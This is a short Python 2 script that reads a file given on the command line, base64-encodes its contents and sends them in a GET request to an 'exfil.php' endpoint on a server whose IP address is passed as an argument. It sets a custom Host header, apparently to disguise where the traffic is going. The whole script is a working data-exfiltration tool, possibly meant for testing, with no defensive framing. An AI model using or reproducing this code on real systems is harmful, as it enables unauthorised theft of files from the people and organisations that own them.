#! /usr/bin/env python

import httplib
import urllib2
import sys
import base64
from urllib2 import Request, urlopen, URLError
#from websocket import create_connection

ip = sys.argv[1]
host = sys.argv[2]
file = sys.argv[3]

content = ''
for line in open(file):
	content = content + line
encoded = base64.b64encode(b'%s' % content)

ip_req = 'http://' + ip + '/exfil.php?content=' + encoded

req = urllib2.Request(ip_req)
req.add_header('Host', host)
req.add_header('User-agent','MyTest')

try:
	res = urllib2.urlopen(req)
	html = res.read()
	print html

except URLError, e:
	if hasattr(e, 'reason'):
        	print 'We failed to reach a server.'
       		print 'Reason: ', e.reason
		print e 
    	elif hasattr(e, 'code'):
        	print 'The server couldn\'t fulfill the request.'
        	print 'Error code: ', e.code
		print e
